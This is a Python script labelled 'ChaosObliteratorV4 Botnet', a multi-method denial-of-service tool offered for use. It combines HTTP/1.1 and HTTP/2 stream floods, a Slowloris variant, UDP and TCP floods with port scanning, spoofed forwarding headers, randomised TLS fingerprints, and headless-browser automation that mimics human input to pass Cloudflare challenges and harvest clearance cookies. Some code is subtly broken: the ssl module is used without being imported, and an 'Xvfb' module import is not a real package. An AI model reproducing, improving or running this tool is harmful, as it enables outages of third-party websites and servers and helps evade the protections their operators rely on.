import threading
import socket
import random
import string
import time
import argparse
import logging
import os
import hashlib
import xxhash
import h2.connection
import h2.events
import json
from typing import List
from playwright.sync_api import sync_playwright
import tls_client
import undetected_chromedriver as uc
import requests
from requests.cookies import RequestsCookieJar

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("chaos_obliterator_v4.log"), logging.StreamHandler()]
)

class ChaosObliteratorV4:
    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None):
        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
        self.target_l4 = target_l4 if target_l4 else None
        self.duration = duration
        self.threads = min(threads, 60)  # Replit-optimized
        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
        self.end_time = time.time() + duration
        self.user_agents = [
            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(120, 122)}.0.0.0 Safari/537.{random.randint(80, 90)}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
        ]
        self.success_count = {m: 0 for m in self.methods}
        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
        self.lock = threading.Lock()
        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        self.jitter_factors = {i: 1.0 for i in range(self.threads)}  # Per-thread jitter
        self.cookies = RequestsCookieJar()  # Upgraded to RequestsCookieJar
        self.session_headers = {}  # Store headers from browser
        self.cookie_file = "cookies.json"  # Store cookies for debugging

    def _random_payload(self, size: int = 512) -> bytes:
        """Upgraded polymorphic payload with larger size."""
        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
        hash1 = xxhash.xxh3_128(seed).digest()
        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
        return (hash4 + hash3 + hash2 + os.urandom(1))[:size]

    def _random_path(self) -> str:
        """Dynamic obfuscated URL paths."""
        prefixes = ["v13", "chaos", "obliterator", "nexus", "vortex"]
        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
        query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"

    def _random_ip(self) -> str:
        """Spoofed IP for headers."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self) -> dict:
        """Upgraded WAF-evading headers with cookie injection."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-graphql"]),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(120, 122)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(120, 122)}"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"'
        }
        headers.update(self.session_headers)  # Inject headers from browser
        if random.random() < 0.99:
            headers["X-Entropy-Nexus"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
        return headers

    def _save_cookies(self, cookies):
        """Save cookies to file for debugging."""
        with open(self.cookie_file, "w") as f:
            json.dump(cookies, f, indent=2)
        logging.info(f"Cookies saved to {self.cookie_file}")

    def _get_browser_session(self):
        """Use headless browser to bypass JS challenges with advanced emulation."""
        max_attempts = 3
        attempt = 0
        viewports = [
            {"width": 1920, "height": 1080},
            {"width": 1366, "height": 768},
            {"width": 1440, "height": 900}
        ]
        while attempt < max_attempts:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    context = browser.new_context(
                        user_agent=random.choice(self.user_agents),
                        viewport=random.choice(viewports),
                        java_script_enabled=True,
                        ignore_https_errors=True
                    )
                    page = context.new_page()
                    
                    # Advanced human behavior emulation
                    page.goto(f"https://{self.target_l7}", wait_until="domcontentloaded", timeout=30000)
                    time.sleep(random.uniform(1, 3))
                    page.evaluate("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
                    time.sleep(random.uniform(0.5, 1.5))
                    page.mouse.move(random.randint(100, 800), random.randint(100, 600))  # Mouse movement
                    time.sleep(random.uniform(0.3, 1))
                    page.mouse.click(random.randint(100, 800), random.randint(100, 600))  # Random click
                    time.sleep(random.uniform(0.5, 1.5))
                    page.keyboard.press("Tab")  # Simulate tab key
                    time.sleep(random.uniform(0.2, 0.8))
                    
                    # Check page status
                    response = page.evaluate("() => document.readyState")
                    if response != "complete":
                        logging.warning(f"Attempt {attempt + 1}: Page not fully loaded.")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Get cookies and validate
                    cookies = context.cookies()
                    cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                    cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                    if not (cf_clearance and cf_bm):
                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm, retrying...")
                        self._save_cookies(cookies)  # Save for debugging
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Store cookies in RequestsCookieJar
                    for cookie in cookies:
                        self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                    
                    # Get headers from browser
                    self.session_headers = {
                        "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "document"
                    }
                    self._save_cookies(cookies)  # Save for debugging
                    browser.close()
                    logging.info("JS challenge passed, cookies obtained.")
                    return
            except Exception as e:
                logging.error(f"Playwright failed: {e}")
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to undetected_chromedriver fallback...")
                    self._get_browser_session_fallback()
        logging.error("Failed to get valid cookies after max attempts.")

    def _get_browser_session_fallback(self):
        """Fallback to undetected_chromedriver with advanced emulation."""
        try:
            options = uc.ChromeOptions()
            options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
            options.add_argument("--headless")
            driver = uc.Chrome(options=options, headless=True, use_subprocess=False)
            driver.get(f"https://{self.target_l7}")
            time.sleep(random.uniform(1, 3))
            driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")  # Scroll
            time.sleep(random.uniform(0.5, 1.5))
            driver.execute_script("document.elementFromPoint(500, 300).click()")  # Random click
            time.sleep(random.uniform(0.3, 1))
            driver.execute_script("window.focus()")  # Simulate focus
            time.sleep(random.uniform(0.2, 0.8))
            
            # Get cookies and validate
            cookies = driver.get_cookies()
            cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
            cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
            if not (cf_clearance and cf_bm):
                logging.error("Fallback: Missing cf_clearance or __cf_bm.")
                self._save_cookies(cookies)
                driver.quit()
                return
            
            # Store cookies in RequestsCookieJar
            for cookie in cookies:
                self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
            
            # Get headers
            self.session_headers = {
                "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Dest": "document"
            }
            self._save_cookies(cookies)
            driver.quit()
            logging.info("Fallback: JS challenge passed, cookies obtained.")
        except Exception as e:
            logging.error(f"Fallback failed: {e}")

    def _check_environment(self):
        """Check environment for dependencies."""
        try:
            import playwright
            logging.info("Playwright detected.")
        except ImportError:
            logging.error("Playwright not installed. Run: pip3 install playwright")
            return False
        try:
            os.system("playwright install chromium > /dev/null 2>&1")
            logging.info("Chromium installed for Playwright.")
        except:
            logging.warning("Failed to install Chromium, fallback may be used.")
        try:
            import Xvfb
            logging.info("Xvfb detected, GUI support available.")
        except ImportError:
            logging.warning("Xvfb not detected, may fail in non-GUI environments.")
        return True

    def _refresh_cookies(self):
        """Refresh cookies every 30 seconds."""
        while time.time() < self.end_time:
            self._get_browser_session()
            time.sleep(30)

    def _scan_ports(self):
        """Dynamic port scanning for L4 targets."""
        if not self.target_l4:
            return
        new_ports = []
        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect((self.target_l4, port))
                new_ports.append(port)
                sock.close()
            except:
                pass
        if new_ports:
            with self.lock:
                self.active_ports = new_ports

    def _adjust_jitter(self, thread_id: int, response_time: float):
        """Per-thread adaptive jitter."""
        with self.lock:
            if response_time > 100:
                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.2, 2.0)
            elif response_time < 50:
                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.8, 0.5)

    def _chaoshttp(self, thread_id: int):
        """Upgraded L7: HTTP flood with tls_client and H2 multiplexing."""
        if not self.target_l7:
            return
        session = tls_client.Session(
            client_identifier=f"chrome_{random.randint(120, 122)}",
            random_tls_extension_order=True
        )
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                proto = random.random()
                if proto < 0.5:  # HTTP/1.1 with browser cookies
                    headers = self._random_headers()
                    method = random.choice(["GET", "POST", "PUT"])
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    body = self._random_payload(512) if method in ["POST", "PUT"] else None
                    if method == "GET":
                        resp = session.get(url, headers=headers)
                    else:
                        resp = session.post(url, headers=headers, data=body)
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                else:  # HTTP/2 with multiplexing
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.015)
                    sock.connect((self.target_l7, 443))
                    context = ssl._create_unverified_context()
                    sock = context.wrap_socket(sock, server_hostname=self.target_l7)
                    h2conn = h2.connection.H2Connection()
                    h2conn.initiate_connection()
                    sock.sendall(h2conn.data_to_send())
                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
                    headers.update(self._random_headers())
                    for stream_id in range(1, 201, 2):  # Up to 100 streams
                        h2conn.send_headers(stream_id, headers, end_stream=True)
                        sock.sendall(h2conn.data_to_send())
                        time.sleep(random.uniform(0.0001, 0.0005) * self.jitter_factors[thread_id])
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                    sock.close()
                time.sleep(random.uniform(0.0001, 0.0006) * self.jitter_factors[thread_id])
            except Exception as e:
                logging.debug(f"ChaosHTTP error: {e}")

    def _ghostloris(self, thread_id: int):
        """Upgraded L7: Ghost Slowloris with tls_client."""
        if not self.target_l7:
            return
        session = tls_client.Session(
            client_identifier=f"chrome_{random.randint(120, 122)}",
            random_tls_extension_order=True
        )
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "X-Forwarded-For": self._random_ip(),
                    "Connection": "keep-alive"
                }
                headers.update(self.session_headers)
                path = self._random_path()
                url = f"https://{self.target_l7}{path}"
                session.get(url, headers=headers, timeout=0.08)  # Low timeout for slow drip
                self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                with self.lock:
                    self.success_count["ghostloris"] += 1
                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                time.sleep(random.uniform(0.001, 0.006) * self.jitter_factors[thread_id])
            except Exception as e:
                logging.debug(f"GhostLoris error: {e}")

    def _udpchaos(self, thread_id: int):
        """L4: UDP chaos with larger payloads."""
        if not self.target_l4:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < self.end_time:
            try:
                port = random.choice(self.active_ports)
                payload = self._random_payload(1024)
                sock.sendto(payload, (self.target_l4, port))
                with self.lock:
                    self.success_count["udpchaos"] += 1
                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
            except:
                pass
        sock.close()

    def _tcpobliterator(self, thread_id: int):
        """L4: TCP obliterator with larger payloads."""
        if not self.target_l4:
            return
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.015)
                port = random.choice(self.active_ports)
                sock.connect((self.target_l4, port))
                sock.send(self._random_payload(512))
                with self.lock:
                    self.success_count["tcpobliterator"] += 1
                sock.close()
                time.sleep(random.uniform(0.00001, 0.0001) * self.jitter_factors[thread_id])
            except:
                pass

    def start(self):
        """Unleash the upgraded chaos obliterator."""
        if not self.target_l7 and not self.target_l4:
            logging.error("At least one target (L7 or L4) required")
            return
        logging.info(f"ChaosObliteratorV4 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
        
        # Check environment
        if not self._check_environment():
            logging.error("Environment check failed, exiting.")
            return
        
        # Start cookie refresh thread
        if self.target_l7:
            threading.Thread(target=self._refresh_cookies, daemon=True).start()
            time.sleep(5)  # Wait for initial cookies
        
        # Start port scanning for L4
        if self.target_l4:
            threading.Thread(target=self._scan_ports, daemon=True).start()
            time.sleep(0.3)
        
        # Split workers: crawler (browser) and flooder
        threads = []
        method_funcs = {
            "chaoshttp": self._chaoshttp,
            "ghostloris": self._ghostloris,
            "udpchaos": self._udpchaos,
            "tcpobliterator": self._tcpobliterator
        }
        for method in self.methods:
            if method in method_funcs:
                for i in range(self.threads // len(self.methods)):
                    t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                    threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
        logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")

def main(target_l7: str, target_l4: str, duration: int, methods: str):
    methods = methods.split(",")
    obliterator = ChaosObliteratorV4(target_l7, target_l4, duration, methods=methods)
    obliterator.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosObliteratorV4 Botnet")
    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
    args = parser.parse_args()
    main(args.target_l7, args.target_l4, args.duration, args.methods)
